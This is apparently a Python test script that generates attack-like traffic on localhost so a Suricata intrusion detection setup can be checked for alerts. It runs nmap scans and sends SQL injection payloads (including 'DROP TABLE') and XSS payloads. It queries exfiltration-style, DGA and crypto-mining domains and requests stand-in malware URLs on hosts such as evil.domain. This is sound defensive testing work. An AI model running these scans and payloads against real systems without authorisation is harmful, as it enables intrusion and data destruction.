#!/usr/bin/env python3
"""
IDS Attack Testing Script
Tests various network attacks to verify Suricata detection capabilities
"""

import subprocess
import time
import socket
import threading
import random
import requests
from datetime import datetime
import sys

class IDSAttackTester:
    def __init__(self):
        self.target_ip = "127.0.0.1"  # localhost for safe testing
        self.external_targets = [
            "8.8.8.8",
            "1.1.1.1", 
            "google.com",
            "example.com"
        ]
        
    def log_attack(self, attack_name, description):
        """Log attack attempt with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {attack_name}: {description}")
        
    def port_scan_attack(self):
        """Simulate port scanning - should trigger Suricata alerts"""
        self.log_attack("PORT_SCAN", "Starting aggressive port scan")
        
        # Use nmap for comprehensive port scanning
        cmd = f"nmap -sS -T4 -p 1-1000 {self.target_ip}"
        try:
            subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
            self.log_attack("PORT_SCAN", "TCP SYN scan completed")
        except subprocess.TimeoutExpired:
            self.log_attack("PORT_SCAN", "TCP SYN scan timed out")
            
        # UDP scan
        cmd = f"nmap -sU -T4 -p 53,161,137 {self.target_ip}"
        try:
            subprocess.run(cmd, shell=True, capture_output=True, timeout=20)
            self.log_attack("PORT_SCAN", "UDP scan completed")
        except subprocess.TimeoutExpired:
            self.log_attack("PORT_SCAN", "UDP scan timed out")
    
    def dns_tunneling_attack(self):
        """Simulate DNS tunneling and suspicious DNS queries"""
        self.log_attack("DNS_TUNNELING", "Starting DNS tunneling simulation")
        
        # Suspicious long DNS queries (potential DNS tunneling)
        suspicious_domains = [
            f"{'a' * 50}.malicious-tunnel.com",
            f"{'b' * 60}.data-exfil.net", 
            f"tunnel-{'x' * 40}.evil.org",
            "base64encodeddata123456789.tunnel.bad",
            "very-long-subdomain-that-looks-like-data-exfiltration.suspicious.domain"
        ]
        
        for domain in suspicious_domains:
            try:
                subprocess.run(f"nslookup {domain}", shell=True, capture_output=True, timeout=5)
                self.log_attack("DNS_TUNNELING", f"Queried suspicious domain: {domain}")
                time.sleep(0.5)
            except:
                pass
    
    def dga_simulation(self):
        """Simulate Domain Generation Algorithm (DGA) behavior"""
        self.log_attack("DGA_SIMULATION", "Starting DGA domain simulation")
        
        # Generate random domains that look like DGA
        tlds = ['.com', '.net', '.org', '.info', '.biz']
        
        for i in range(10):
            # Random string resembling DGA
            random_chars = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=12))
            domain = f"{random_chars}{random.choice(tlds)}"
            
            try:
                subprocess.run(f"nslookup {domain}", shell=True, capture_output=True, timeout=3)
                self.log_attack("DGA_SIMULATION", f"Queried DGA-like domain: {domain}")
                time.sleep(0.3)
            except:
                pass
    
    def crypto_mining_domains(self):
        """Query known crypto-mining related domains"""
        self.log_attack("CRYPTO_MINING", "Testing crypto-mining domain detection")
        
        crypto_domains = [
            "coinhive.com",
            "crypto-loot.com", 
            "coin-have.com",
            "minero.cc",
            "webminepool.com",
            "miner.pr0gramm.com"
        ]
        
        for domain in crypto_domains:
            try:
                subprocess.run(f"nslookup {domain}", shell=True, capture_output=True, timeout=5)
                self.log_attack("CRYPTO_MINING", f"Queried crypto domain: {domain}")
                time.sleep(0.5)
            except:
                pass
    
    def http_attacks(self):
        """Simulate various HTTP-based attacks"""
        self.log_attack("HTTP_ATTACKS", "Starting HTTP attack simulation")
        
        # SQL injection attempts
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT * FROM users--",
            "admin'/*",
            "' OR 1=1#"
        ]
        
        for payload in sql_payloads:
            try:
                url = f"http://{self.target_ip}:5053/api/test?id={payload}"
                requests.get(url, timeout=3)
                self.log_attack("SQL_INJECTION", f"Attempted SQL injection: {payload}")
                time.sleep(0.5)
            except:
                pass
        
        # XSS attempts
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "'><script>alert(String.fromCharCode(88,83,83))</script>"
        ]
        
        for payload in xss_payloads:
            try:
                url = f"http://{self.target_ip}:5053/api/test?data={payload}"
                requests.get(url, timeout=3)
                self.log_attack("XSS_ATTEMPT", f"Attempted XSS: {payload[:30]}...")
                time.sleep(0.5)
            except:
                pass
    
    def suspicious_user_agents(self):
        """Test detection of suspicious User-Agent strings"""
        self.log_attack("SUSPICIOUS_UA", "Testing suspicious User-Agent detection")
        
        suspicious_agents = [
            "Nikto",
            "sqlmap",
            "Nessus",
            "OpenVAS",
            "w3af",
            "Burp Suite",
            "OWASP ZAP"
        ]
        
        for agent in suspicious_agents:
            try:
                headers = {'User-Agent': agent}
                requests.get(f"http://{self.target_ip}:5053", headers=headers, timeout=3)
                self.log_attack("SUSPICIOUS_UA", f"Used suspicious User-Agent: {agent}")
                time.sleep(0.5)
            except:
                pass
    
    def network_scanning(self):
        """Perform network reconnaissance that should trigger alerts"""
        self.log_attack("NETWORK_RECON", "Starting network reconnaissance")
        
        # OS fingerprinting
        try:
            subprocess.run(f"nmap -O {self.target_ip}", shell=True, capture_output=True, timeout=20)
            self.log_attack("OS_FINGERPRINT", "OS fingerprinting scan completed")
        except:
            pass
        
        # Service version detection
        try:
            subprocess.run(f"nmap -sV -p 22,80,443,5053 {self.target_ip}", shell=True, capture_output=True, timeout=30)
            self.log_attack("SERVICE_DETECT", "Service version detection completed")
        except:
            pass
        
        # Aggressive scan with scripts
        try:
            subprocess.run(f"nmap -A -T4 -p 80,443,5053 {self.target_ip}", shell=True, capture_output=True, timeout=30)
            self.log_attack("AGGRESSIVE_SCAN", "Aggressive scan with scripts completed")
        except:
            pass
    
    def malicious_downloads(self):
        """Simulate malicious file downloads"""
        self.log_attack("MALICIOUS_DOWNLOAD", "Simulating malicious downloads")
        
        # Attempt to download suspicious files
        suspicious_urls = [
            "http://example.com/malware.exe",
            "http://test.com/trojan.zip", 
            "http://malicious.site/payload.dll",
            "http://evil.domain/backdoor.bat"
        ]
        
        for url in suspicious_urls:
            try:
                requests.get(url, timeout=5)
                self.log_attack("MALICIOUS_DOWNLOAD", f"Attempted download: {url}")
                time.sleep(0.5)
            except:
                pass
    
    def run_all_tests(self):
        """Run comprehensive IDS testing"""
        print("="*60)
        print("STARTING COMPREHENSIVE IDS ATTACK TESTING")
        print("="*60)
        
        tests = [
            ("DNS Attacks", self.dns_tunneling_attack),
            ("DGA Simulation", self.dga_simulation),
            ("Crypto Mining", self.crypto_mining_domains),
            ("HTTP Attacks", self.http_attacks),
            ("Suspicious User-Agents", self.suspicious_user_agents),
            ("Port Scanning", self.port_scan_attack),
            ("Network Reconnaissance", self.network_scanning),
            ("Malicious Downloads", self.malicious_downloads)
        ]
        
        for test_name, test_func in tests:
            print(f"\n--- {test_name} ---")
            try:
                test_func()
                print(f"✅ {test_name} completed")
            except Exception as e:
                print(f"❌ {test_name} failed: {str(e)}")
            
            # Wait between test categories
            time.sleep(2)
        
        print("\n" + "="*60)
        print("IDS ATTACK TESTING COMPLETED")
        print("="*60)
        print("\nWait 30 seconds for Suricata to process all events...")
        time.sleep(30)

if __name__ == "__main__":
    tester = IDSAttackTester()
    tester.run_all_tests()
    
    print("\nTesting completed! Check the dashboard for new alerts.")
